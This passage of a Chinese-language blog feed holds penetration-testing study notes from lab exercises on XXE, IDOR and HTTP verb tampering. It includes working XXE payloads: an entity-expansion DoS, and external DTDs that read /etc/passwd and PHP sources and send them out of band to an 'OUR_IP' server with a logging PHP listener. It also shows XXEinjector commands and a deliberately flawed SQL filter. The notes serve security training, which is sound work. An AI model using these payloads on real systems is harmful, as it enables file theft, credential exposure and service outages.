&quot;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&quot;&gt;          &lt;!ENTITY a10 &quot;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&quot;&gt;        ]&gt;&lt;root&gt;&lt;name&gt;&lt;/name&gt;&lt;tel&gt;&lt;/tel&gt;&lt;email&gt;&amp;a10;&lt;/email&gt;&lt;message&gt;&lt;/message&gt;&lt;/root&gt;</code></pre><p>这个有效负载将a0实体定义为DOS，在a1中多次引用它，在a2中引用a1，以此类推，直到后端服务器的内存由于自引用循环而耗尽。然而，这种攻击不再适用于现代web服务器（例如Apache），因为它们可以防止实体自引用。</p><h1 id="Advanced-File-Disclosure"><a href="#Advanced-File-Disclosure" class="headerlink" title="Advanced File Disclosure"></a>Advanced File Disclosure</h1><p>并非所有XXE漏洞都可以直接利用，正如我们在上一节中所看到的那样。有些文件格式可能无法通过基本的XXE读取，而在其他情况下，web应用程序在某些情况下可能不会输出任何输入值，因此我们可能会试图通过错误来使用它。</p><h2 id="Advanced-Exfiltration-with-CDATA"><a href="#Advanced-Exfiltration-with-CDATA" class="headerlink" title="Advanced Exfiltration with CDATA"></a>Advanced Exfiltration with CDATA</h2><p>在上一节中，我们看到了如何使用PHP过滤器对PHP源文件进行编码，以便它们在被引用时不会破坏XML格式，这（正如我们所看到的）阻止了我们读取这些文件。但是其他类型的Web应用程序呢？我们可以使用另一种方法为任何web应用程序后端提取任何类型的数据（包括二进制数据）。要输出不符合XML格式的数据，我们可以使用CDATA标记（例如&lt;！[CDATA[file_content]]）包装外部文件引用的内容。通过这种方式，XML解析器将考虑这部分原始数据，这些数据可能包含任何类型的数据，包括任何特殊字符。 解决这个问题的一个简单方法是用&lt;！[CDATA[，一个带有]]&gt;的结束内部实体，然后将我们的外部实体文件放在两者之间，它应该被视为CDATA元素，如下所示：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY begin &quot;&lt;![CDATA[&quot;&gt;  &lt;!ENTITY file SYSTEM &quot;file:///var/www/html/submitDetails.php&quot;&gt;  &lt;!ENTITY end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY joined &quot;&amp;begin;&amp;file;&amp;end;&quot;&gt;]&gt;</code></pre><p>之后，如果我们引用&amp;joind；实体，它应该包含我们的转义数据。然而，这是行不通的，因为XML阻止连接内部和外部实体，所以我们必须找到更好的方法。 为了绕过这一限制，我们可以使用XML参数实体，这是一种特殊类型的实体，以%字符开头，只能在DTD中使用。参数实体的独特之处在于，如果我们从外部源（例如，我们自己的服务器）引用它们，那么所有这些实体都将被视为外部实体，并且可以连接，如下所示：</p><pre><code class="xml">&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;</code></pre><p>因此，让我们尝试读取submitDetails.php文件，方法是首先将上述行存储在DTD文件（例如xxe.DTD）中，将其托管在我们的机器上，然后将其作为目标web应用程序上的外部实体引用，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo &#39;&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;&#39; &gt; xxe.dtdTanin@htb[/htb]$ python3 -m http.server 8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><p>现在，我们可以引用我们的外部实体（xxe.dtd），然后打印&amp;joind；我们在上面定义的实体，它应该包含submitDetails.php文件的内容，如下所示：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY % begin &quot;&lt;![CDATA[&quot;&gt; &lt;!-- prepend the beginning of the CDATA tag --&gt;  &lt;!ENTITY % file SYSTEM &quot;file:///var/www/html/submitDetails.php&quot;&gt; &lt;!-- reference external file --&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!-- append the end of the CDATA tag --&gt;  &lt;!ENTITY % xxe SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt; &lt;!-- reference our external DTD --&gt;  %xxe;]&gt;...&lt;email&gt;&amp;joined;&lt;/email&gt; &lt;!-- reference the &amp;joined; entity to print the file content --&gt;</code></pre><p>一旦我们编写了xxe.dtd文件，并将其托管在我们的机器上，然后将上面的行添加到我们对易受攻击的web应用程序的HTTP请求中，我们就可以最终获得submitDetails.php文件的内容：</p><blockquote><p>注意：在一些现代web服务器中，我们可能无法读取某些文件（如index.php），因为web服务器将防止由文件&#x2F;实体自引用（即XML实体引用循环）引起的DOS攻击，如前一节所述。</p></blockquote><p>当基本的XXE方法不起作用或处理其他web开发框架时，这个技巧会变得非常方便。尝试使用此技巧读取其他文件。</p><h2 id="Error-Based-XXE"><a href="#Error-Based-XXE" class="headerlink" title="Error Based XXE"></a>Error Based XXE</h2><p>我们可能会遇到的另一种情况是，web应用程序可能不会编写任何输出，因此我们无法控制任何XML输入实体来编写其内容。在这种情况下，我们将对XML输出视而不见，因此无法使用我们通常的方法检索文件内容。 如果web应用程序显示运行时错误（例如，PHP错误），并且没有对XML输入进行适当的异常处理，那么我们可以使用此缺陷读取XXE漏洞的输出。如果web应用程序既不编写XML输出也不显示任何错误，那么我们将面临完全盲目的情况，我们将在下一节中对此进行讨论。 让我们考虑一下本节末尾&#x2F;error中的练习，其中没有任何XML输入实体显示在屏幕上。因此，我们没有可以控制的实体来编写文件输出。首先，让我们尝试发送格式错误的XML数据，并查看web应用程序是否显示任何错误。为此，我们可以删除任何关闭标记，更改其中一个，使其不关闭（例如，<roo>而不是<root>），或者仅引用不存在的实体，如下所示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121101005.jpeg" alt="cause_error"></p><p>我们看到，我们确实导致web应用程序显示错误，而且它还显示了web服务器目录，我们可以使用该目录读取其他文件的源代码。现在，我们可以利用这个漏洞来泄露文件内容。要做到这一点，我们将使用与之前使用的技术类似的技术。首先，我们将托管一个DTD文件，该文件包含以下有效负载：</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hosts&quot;&gt;&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &#39;%nonExistingEntity;/%file;&#39;&gt;&quot;&gt;</code></pre><p>上面的负载定义了文件参数实体，然后将其与一个不存在的实体连接。在我们之前的练习中，我们连接了三根弦。在这种情况下，%nonExistingEntity；不存在，所以web应用程序会抛出一个错误，说这个实体不存在，以及我们加入的%file；作为错误的一部分。还有许多其他变量可能会导致错误，比如错误的URI或引用文件中有错误的字符。 现在，我们可以调用外部DTD脚本，然后引用错误实体，如下所示：</p><pre><code class="xml">&lt;!DOCTYPE email [   &lt;!ENTITY % remote SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt;  %remote;  %error;]&gt;</code></pre><p>一旦我们像前面那样托管DTD脚本，并将上述有效负载作为XML数据发送（不需要包括任何其他XML数据），我们将获得&#x2F;etc&#x2F;hosts文件的内容</p><p>这种方法也可以用于读取文件的源代码。我们所要做的就是更改DTD脚本中的文件名，以指向我们想要读取的文件（例如“file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;submitDetails.php“）。然而，这种方法不如以前读取源文件的方法可靠，因为它可能有长度限制，而且某些特殊字符仍然可能会破坏它。</p><h1 id="Blind-Data-Exfiltration"><a href="#Blind-Data-Exfiltration" class="headerlink" title="Blind Data Exfiltration"></a>Blind Data Exfiltration</h1><p>在上一节中，我们看到了一个盲XXE漏洞的示例，在该漏洞中，我们没有收到任何包含任何XML输入实体的输出。由于web服务器显示PHP运行时错误，我们可以使用此缺陷从显示的错误中读取文件的内容。在本节中，我们将了解如何在完全盲目的情况下获取文件的内容，在这种情况下，我们既不会获得任何XML实体的输出，也不会显示任何PHP错误。</p><h2 id="Out-of-band-Data-Exfiltration"><a href="#Out-of-band-Data-Exfiltration" class="headerlink" title="Out-of-band Data Exfiltration"></a>Out-of-band Data Exfiltration</h2><p>如果我们试图通过在&#x2F;wind上找到的练习重复任何方法，我们会很快注意到它们似乎都不起作用，因为我们无法在web应用程序响应上打印任何内容。对于这种情况，我们可以使用一种称为带外（OOB）数据过滤的方法，该方法通常用于具有许多网络攻击的类似盲情况，如盲SQL注入、盲命令注入、盲XSS，当然还有盲XXE。跨站点脚本（XSS）和Whitebox Pentesting 101:Command Injections模块都讨论了类似的攻击，这里我们将利用类似的攻击进行轻微修改，以适应我们的XXE漏洞。 在我们之前的攻击中，我们使用了带外攻击，因为我们在机器中托管了DTD文件，并使web应用程序连接到我们（因此是带外）。所以，我们这次的进攻将非常相似，只有一个显著的区别。我们将使web应用程序向我们的web服务器发送一个web请求，其中包含我们正在读取的文件的内容，而不是让web应用程序将我们的文件实体输出到特定的XML实体。 为此，我们可以首先为正在读取的文件的内容使用一个参数实体，同时使用PHP过滤器对其进行base64编码。然后，我们将创建另一个外部参数实体并将其引用到我们的IP，并将文件参数值作为通过HTTP请求的URL的一部分，如下所示：</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;&lt;!ENTITY % oob &quot;&lt;!ENTITY content SYSTEM &#39;http://OUR_IP:8000/?content=%file;&#39;&gt;&quot;&gt;</code></pre><p>例如，如果我们要读取的文件的内容为XXE_SAMPLE_DATA，那么文件参数将保存其base64编码的数据（WFhFX1NBTVBMRV9EQVRB）。当XML试图从我们的机器引用外部oob参数时，它将请求<a href="http://our_ip:8000/?content=WFhFX1NBTVBMRV9EQVRB.%E6%9C%80%E5%90%8E%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%AF%B9WFhFX1NBTVBMRV9EQVRB%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81%EF%BC%8C%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82%E6%88%91%E4%BB%AC%E7%94%9A%E8%87%B3%E5%8F%AF%E4%BB%A5%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PHP%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B%E7%BC%96%E7%A0%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%AF%B9%E5%85%B6%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E8%BE%93%E5%87%BA%E5%88%B0%E7%BB%88%E7%AB%AF%EF%BC%9A">http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB.最后，我们可以对WFhFX1NBTVBMRV9EQVRB字符串进行解码，以获得文件的内容。我们甚至可以编写一个简单的PHP脚本，自动检测编码的文件内容，对其进行解码，并将其输出到终端：</a></p><pre><code class="php">&lt;?phpif(isset($_GET[&#39;content&#39;]))&#123;    error_log(&quot;\n\n&quot; . base64_decode($_GET[&#39;content&#39;]));&#125;?&gt;</code></pre><p>因此，我们将首先将上面的PHP代码写入index.PHP，然后在8000端口上启动一个PHP服务器，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ vi index.php # here we write the above PHP codeTanin@htb[/htb]$ php -S 0.0.0.0:8000PHP 7.4.3 Development Server (http://0.0.0.0:8000) started</code></pre><p>现在，为了启动我们的攻击，我们可以使用与基于错误的攻击中使用的负载类似的负载，只需添加<root>&amp;content</root>，它需要引用我们的实体，并让它向我们的机器发送带有文件内容的请求：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email [   &lt;!ENTITY % remote SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt;  %remote;  %oob;]&gt;&lt;root&gt;&amp;content;&lt;/root&gt;</code></pre><p>然后，我们可以将请求发送到web应用程序：</p><p>最后，我们可以回到我们的终端，我们将看到我们确实得到了请求及其解码内容：</p><pre><code class="shell-session">PHP 7.4.3 Development Server (http://0.0.0.0:8000) started10.10.14.16:46256 Accepted10.10.14.16:46256 [200]: (null) /xxe.dtd10.10.14.16:46256 Closing10.10.14.16:46258 Acceptedroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologin...SNIP...</code></pre><p>提示：除了将base64编码的数据存储为URL的参数外，我们还可以使用DNS OOB Exfiltering，将编码的数据作为URL的子域（例如ENCODEDTEXT.our.website.com），然后使用tcpdump等工具捕获任何传入流量并解码子域字符串以获取数据。诚然，这种方法更先进，需要付出更多的努力来过滤数据。</p><h2 id="Automated-OOB-Exfiltration"><a href="#Automated-OOB-Exfiltration" class="headerlink" title="Automated OOB Exfiltration"></a>Automated OOB Exfiltration</h2><p>尽管在某些情况下，我们可能不得不使用上面学到的手动方法，但在许多其他情况下，可以使用工具自动化盲XXE数据的过滤过程。 <a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a>就是这样一个工具。该工具支持我们在本模块中学到的大多数技巧，包括基本XXE、CDATA源exfiltering、基于错误的XXE和盲目OOB XXE。 要使用此工具进行OOB自动过滤，我们可以首先将该工具克隆到我们的机器上，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.gitCloning into &#39;XXEinjector&#39;......SNIP...</code></pre><p>一旦我们有了这个工具，我们就可以从Burp复制HTTP请求，并将其写入一个文件供工具使用。我们不应该包括完整的XML数据，只包括第一行，并在它后面写XXEINJECT作为工具的位置定位器：</p><pre><code class="http">POST /blind/submitDetails.php HTTP/1.1Host: 10.129.201.94Content-Length: 169User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Content-Type: text/plain;charset=UTF-8Accept: */*Origin: http://10.129.201.94Referer: http://10.129.201.94/blind/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: close&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;XXEINJECT</code></pre><p>现在，我们可以运行该工具，–host&#x2F;-httpport标志是我们的IP和端口，–file标志是我们上面写的文件，–path标志是我们想要读取的文件。我们还将选择–oob&#x3D;http和–phpfilter标志来重复我们上面所做的oob攻击，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter...SNIP...[+] Sending request with malicious XML.[+] Responding with XML for: /etc/passwd[+] Retrieved data:</code></pre><p>我们看到该工具没有直接打印数据。这是因为我们对数据进行base64编码，所以它不会被打印出来。在任何情况下，所有经过过滤的文件都会存储在该工具下的Logs文件夹中，我们可以在那里找到我们的文件：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...SNIP..</code></pre><h1 id="XXE-Prevention"><a href="#XXE-Prevention" class="headerlink" title="XXE Prevention"></a>XXE Prevention</h1><p>除了使用最新的XML库之外，web应用程序的某些XML配置还有助于降低XXE被利用的可能性。其中包括： </p><p>禁用引用自定义文档类型定义（DTD） </p><p>禁用引用外部XML实体 禁用参数实体处理 禁用对XInclude的支持</p><p> 防止实体引用循环 </p><p>我们看到的另一件事是基于错误的XXE利用。因此，我们应该在web应用程序中始终有适当的异常处理，并且应该始终禁用在web服务器中显示运行时错误。 如果我们错过了更新某些XML库，这样的配置应该是另一层保护，并且还应该防止XXE被利用。然而，在这种情况下，我们可能仍然使用易受攻击的库，并且只应用防止利用的变通方法，这并不理想。 由于XML数据引入了各种问题和漏洞，许多人还建议使用其他格式，如JSON或YAML。这还包括避免使用依赖XML（例如SOAP）的API标准，而使用基于JSON的API（例如REST）。 最后，使用Web应用程序防火墙（WAF）是防止XXE利用的另一层保护措施。然而，我们永远不应该完全依赖WAF，让后端变得脆弱，因为WAF总是可以绕过的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Attacks-IDOR</title>
      <link href="/2023/09/06/Web-Attacks-IDOR/"/>
      <url>/2023/09/06/Web-Attacks-IDOR/</url>
      
        <content type="html"><![CDATA[<h1 id="Intro-to-IDOR"><a href="#Intro-to-IDOR" class="headerlink" title="Intro to IDOR"></a>Intro to IDOR</h1><p>不安全的直接对象引用（IDOR）漏洞是最常见的web漏洞之一，会严重影响易受攻击的web应用程序。当web应用程序暴露对对象（如文件或数据库资源）的直接引用时，就会出现IDOR漏洞，最终用户可以直接控制该对象以获得对其他类似对象的访问权限。如果由于缺乏可靠的访问控制系统，任何用户都可以访问任何资源，则该系统被认为是易受攻击的。 构建一个可靠的访问控制系统非常具有挑战性，这就是IDOR漏洞普遍存在的原因。此外，自动化识别访问控制系统弱点的过程也相当困难，这可能导致这些弱点在进入生产之前一直无法识别。 例如，如果用户请求访问他们最近上传的文件，他们可能会得到一个链接，例如（download.php？file_id&#x3D;123）。因此，由于链接直接引用了带有（file_id&#x3D;122）的文件，如果我们试图用（download.php！file_id&#x3D;124）访问另一个文件（可能不属于我们），会发生什么？如果web应用程序在后端没有适当的访问控制系统，我们可以通过发送带有file_id的请求来访问任何文件。在许多情况下，我们可能会发现id很容易被猜测，从而可以根据我们的权限检索许多我们不应该访问的文件或资源。</p><h2 id="What-Makes-an-IDOR-Vulnerability"><a href="#What-Makes-an-IDOR-Vulnerability" class="headerlink" title="What Makes an IDOR Vulnerability"></a>What Makes an IDOR Vulnerability</h2><p>仅仅公开对内部对象或资源的直接引用本身并不是一个漏洞。然而，这可能会使利用另一个漏洞成为可能：弱访问控制系统。许多web应用程序通过限制用户访问可以检索这些资源的页面、函数和API来限制用户访问资源。然而，如果用户以某种方式访问了这些页面（例如，通过共享&#x2F;猜测的链接），会发生什么？他们仍然能够通过简单的链接访问相同的资源吗？如果web应用程序的后端没有访问控制系统来比较用户的身份验证和资源的访问列表，那么他们可能能够。<br>有许多方法可以实现用于web应用程序的可靠访问控制系统，例如具有基于角色的访问控制（RBAC）系统。主要结论是，IDOR漏洞的存在主要是由于后端缺乏访问控制。如果用户直接引用了缺乏访问控制的web应用程序中的对象，攻击者就有可能查看或修改其他用户的数据。<br>许多开发人员忽略了构建访问控制系统；因此，大多数web应用程序和移动应用程序在后端都没有受到保护。在这样的应用程序中，所有用户都可以任意访问后端上的所有其他用户的数据。阻止用户访问其他用户数据的唯一方法是应用程序的前端实现，该应用程序旨在只显示用户的数据。在这种情况下，手动操作HTTP请求可能会显示所有用户都可以完全访问所有数据，从而导致成功的攻击。<br>所有这些都使IDOR漏洞成为任何web或移动应用程序最关键的漏洞之一，这不仅是因为暴露了直接的对象引用，而且主要是因为缺乏可靠的访问控制系统。即使是一个基本的访问控制系统也很难开发。一个覆盖整个web应用程序而不干扰其功能的全面访问控制系统可能是一项更困难的任务。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p> Try to read the details of the user with ‘uid&#x3D;5’. What is their ‘uuid’ value?</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309110933889.png" alt="image-20230911093346827"></p><p>抓包后提交的信息稍微多，我们先修改uid，发现返回：</p><pre><code>uid mismatch</code></pre><p>他似乎把接口与uid相对应起来，我们同时更改接口号为2：</p><pre><code>uuid mismatch</code></pre><p>正如我们所看到的，这一次，我们收到一条错误消息，说uuid不匹配。web应用程序似乎正在检查我们发送的uuid值是否与用户的uuid匹配。由于我们正在发送自己的uuid，因此我们的请求失败了。这似乎是防止用户更改其他用户详细信息的另一种访问控制形式。 接下来，让我们看看是否可以创建一个向API端点发出POST请求的新用户。我们可以将请求方法更改为POST，将uid更改为新的uid，并将请求发送到新uid的API端点：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309110940315.png" alt="image-20230911094045276"></p><p>尝试将我们的角色更改为admin&#x2F;administrator以获得更高的权限。不幸的是，在不知道有效角色名称的情况下，我们在HTTP响应中得到无效角色</p><p>此时我们发现uid与接口号是相对应的，我们尝试像端口5发送get请求：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309110945977.png" alt="image-20230911094538943"></p><p>拿到uuid</p><h1 id="Chaining-IDOR-Vulnerabilities"><a href="#Chaining-IDOR-Vulnerabilities" class="headerlink" title="Chaining IDOR Vulnerabilities"></a>Chaining IDOR Vulnerabilities</h1><p>通常，对API端点的GET请求应该返回被请求用户的详细信息，因此我们可以尝试调用它来查看是否可以检索用户的详细内容。我们还注意到，页面加载后，它会通过向同一API端点的GET请求获取用户详细信息：</p><p>如前一节所述，我们的HTTP请求中唯一的授权形式是role&#x3D;employee cookie，因为HTTP请求不包含任何其他形式的用户特定授权，例如JWT令牌。即使令牌确实存在，除非后端访问控制系统将其与请求的对象详细信息进行主动比较，否则我们仍然可以检索其他用户的详细信息。</p><h2 id="Information-Disclosure"><a href="#Information-Disclosure" class="headerlink" title="Information Disclosure"></a>Information Disclosure</h2><h2 id="Modifying-Other-Users’-Details"><a href="#Modifying-Other-Users’-Details" class="headerlink" title="Modifying Other Users’ Details"></a>Modifying Other Users’ Details</h2><p>除了允许我们查看潜在的敏感细节外，修改另一个用户的详细信息的能力还使我们能够执行其他几种攻击。一种类型的攻击是修改用户的电子邮件地址，然后请求密码重置链接，该链接将发送到我们指定的电子邮件地址中，从而使我们能够控制他们的帐户。另一种潜在的攻击是在“about”字段中放置XSS有效载荷，一旦用户访问其编辑配置文件页面，就会执行该有效载荷，使我们能够以不同的方式攻击用户。</p><h2 id="Chaining-Two-IDOR-Vulnerabilities"><a href="#Chaining-Two-IDOR-Vulnerabilities" class="headerlink" title="Chaining Two IDOR Vulnerabilities"></a>Chaining Two IDOR Vulnerabilities</h2><p>由于我们发现了IDOR Information Disclosure漏洞，我们还可以枚举所有用户并查找其他角色，最好是管理员角色。尝试编写一个脚本来枚举所有用户，类似于我们之前所做的操作。 一旦我们枚举了所有用户，我们将找到一个具有以下详细信息的管理员用户：</p><p>通过将我们从IDOR information Disclosure漏洞获得的信息与API端点上的IDOR Insecure Function Calls攻击相结合，我们可以修改其他用户的详细信息并创建&#x2F;删除用户，同时绕过各种访问控制检查。在许多情况下，我们通过IDOR漏洞泄露的信息可以用于其他攻击，如IDOR或XSS，从而导致更复杂的攻击或绕过现有的安全机制。 有了我们的新角色，我们还可以执行批量分配来更改所有用户的特定字段，比如在他们的配置文件中放置XSS有效载荷，或者将他们的电子邮件更改为我们指定的电子邮件。</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Attacks-HTTP Verb Tampering</title>
      <link href="/2023/09/06/Web-Attacks/"/>
      <url>/2023/09/06/Web-Attacks/</url>
      
        <content type="html"><![CDATA[<h1 id="Intro-to-HTTP-Verb-Tampering"><a href="#Intro-to-HTTP-Verb-Tampering" class="headerlink" title="Intro to HTTP Verb Tampering"></a>Intro to HTTP Verb Tampering</h1><p>HTTP协议的工作原理是在HTTP请求开始时接受各种HTTP方法作为谓词。根据web服务器配置，可以编写web应用程序的脚本以接受用于其各种功能的特定HTTP方法，并基于请求的类型执行特定操作。 虽然程序员主要考虑两种最常用的HTTP方法，GET和POST，但任何客户端都可以在其HTTP请求中发送任何其他方法，然后查看web服务器如何处理这些方法。假设web应用程序和后端web服务器都被配置为只接受GET和POST请求。在这种情况下，发送不同的请求将导致显示web服务器错误页面，这本身并不是一个严重的漏洞（除了提供糟糕的用户体验并可能导致信息泄露之外）。另一方面，如果web服务器配置不限于仅接受web服务器所需的HTTP方法（例如GET&#x2F;POST），并且web应用程序没有被开发为处理其他类型的HTTP请求（例如HEAD、PUT），那么我们可能能够利用这种不安全的配置来访问我们无法访问的功能，或者甚至绕过某些安全控制。</p><span id="more"></span><h2 id="HTTP-Verb-Tampering"><a href="#HTTP-Verb-Tampering" class="headerlink" title="HTTP Verb Tampering"></a>HTTP Verb Tampering</h2><p> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">9 different verbs</a></p><p>可以想象，上面的一些方法可以执行非常敏感的功能，比如将（PUT）或删除（DELETE）文件写入后端服务器上的webroot目录。正如Web请求模块中所讨论的，如果Web服务器没有安全地配置为管理这些方法，我们可以使用它们来控制后端服务器。然而，HTTP谓词篡改攻击更常见（因此更为关键）的原因是，它们是由后端web服务器或web应用程序中的错误配置引起的，这两者都可能导致漏洞。</p><h2 id="Insecure-Configurations"><a href="#Insecure-Configurations" class="headerlink" title="Insecure Configurations"></a>Insecure Configurations</h2><p>不安全的web服务器配置导致第一类HTTP谓词篡改漏洞。web服务器的身份验证配置可能仅限于特定的HTTP方法，这将使一些HTTP方法在没有身份验证的情况下可以访问。例如，系统管理员可以使用以下配置要求对特定网页进行身份验证：</p><pre><code class="xml">&lt;Limit GET POST&gt;    Require valid-user&lt;/Limit&gt;</code></pre><p>正如我们所看到的，即使配置为身份验证方法指定了GET和POST请求，攻击者仍然可能使用不同的HTTP方法（如HEAD）来完全绕过此身份验证机制，这将在下一节中看到。这最终导致身份验证绕过，并允许攻击者访问他们不应该访问的网页和域。</p><h2 id="Insecure-Coding"><a href="#Insecure-Coding" class="headerlink" title="Insecure Coding"></a>Insecure Coding</h2><p>不安全的编码实践会导致其他类型的HTTP谓词篡改漏洞（尽管有些人可能不考虑这种谓词篡改）。当web开发人员应用特定的过滤器来减轻特定的漏洞，而不使用该过滤器覆盖所有HTTP方法时，就会发生这种情况。例如，如果发现某个网页易受SQL注入漏洞的攻击，并且后端开发人员通过以下应用输入净化筛选器来减轻SQL注入漏洞：</p><pre><code class="php">$pattern = &quot;/^[A-Za-z\s]+$/&quot;;if(preg_match($pattern, $_GET[&quot;code&quot;])) &#123;    $query = &quot;Select * from ports where port_code like &#39;%&quot; . $_REQUEST[&quot;code&quot;] . &quot;%&#39;&quot;;    ...SNIP...&#125;</code></pre><p>我们可以看到，过滤器&#x3D;&#x3D;只在GET参数&#x3D;&#x3D;上进行测试。如果GET请求不包含任何坏字符，那么将执行查询。但是，在执行查询时，会使用$_REQUEST[“code”]参数，这些参数也可能包含POST参数，从而导致HTTP谓词的使用不一致。在这种情况下，攻击者可能会使用POST请求来执行SQL注入，在这种情况中，GET参数将为空（不包括任何坏字符）。该请求将通过安全过滤器，这将使函数仍然容易受到SQL注入的攻击。 虽然上述两个漏洞都是在公共场合发现的，但第二个漏洞要常见得多，因为它是由于编码错误造成的，而第一个漏洞通常可以通过安全的web服务器配置来避免，因为文档经常警告不要这样做。在接下来的部分中，我们将看到这两种类型的示例以及如何利用它们。</p><h1 id="Bypassing-Basic-Authentication"><a href="#Bypassing-Basic-Authentication" class="headerlink" title="Bypassing Basic Authentication"></a>Bypassing Basic Authentication</h1><p>利用HTTP谓词篡改漏洞通常是一个相对简单的过程。我们只需要尝试其他HTTP方法，看看web服务器和web应用程序是如何处理它们的。虽然许多自动漏洞扫描工具可以一致地识别由不安全的服务器配置引起的HTTP Verb篡改漏洞，但它们通常无法识别由不可靠的编码引起的HTTP篡改漏洞。这是因为一旦我们绕过身份验证页面，第一种类型就可以很容易地识别出来，而另一种类型则需要主动测试，看看我们是否可以绕过现有的安全过滤器。 第一种类型的HTTP谓词篡改漏洞主要由不安全的Web服务器配置引起，利用该漏洞可以绕过某些页面上的HTTP基本身份验证提示。</p><h2 id="Identify"><a href="#Identify" class="headerlink" title="Identify"></a>Identify</h2><p>当我们在本节结束时开始练习时，我们看到我们有一个基本的File Manager web应用程序，在其中我们可以通过键入新文件的名称并点击enter来添加新文件：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061525315.jpeg" alt="img"></p><p>但是，假设我们试图通过单击红色的“重置”按钮来删除所有文件。在这种情况下，我们看到该功能似乎仅限于经过身份验证的用户，因为我们得到了以下HTTP基本身份验证提示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061525778.jpeg" alt="img"></p><p>由于我们没有任何凭据，我们将获得一个401未经授权的页面：由于我们没有任何凭据，我们将获得一个401未经授权的页面</p><p>所以，让我们看看我们是否可以通过HTTP动词篡改攻击绕过这一点。为此，我们需要确定哪些页面受到此身份验证的限制。如果我们在点击Reset按钮后检查HTTP请求，或者在点击该按钮后查看该按钮导航到的URL，我们会发现它位于&#x2F;admin&#x2F;Reset.php。因此，&#x2F;admin目录仅限于经过身份验证的用户，或者只有&#x2F;admin&#x2F;recet.php页面。我们可以通过访问&#x2F;admin目录来确认这一点，并且确实会提示我们再次登录。这意味着完整的&#x2F;admin目录受到限制。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>为了尝试利用该页面，我们需要确定web应用程序使用的HTTP请求方法。我们可以在Burp Suite中拦截请求并进行检查：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061525863.jpeg" alt="unauthorized_request"></p><p>由于页面使用GET请求，我们可以发送POST请求，并查看网页是否允许POST请求（即验证是否涵盖POST请求）。要做到这一点，我们可以右键点击Burp中拦截的请求，然后选择Change request Method，它会自动将请求更改为POST请求：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061526919.jpeg" alt="change_request"></p><p>完成后，我们可以单击“前进”并在浏览器中查看页面。不幸的是，如果我们不提供凭据，我们仍然会被提示登录，并将获得401未经授权的页面：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061526326.jpeg" 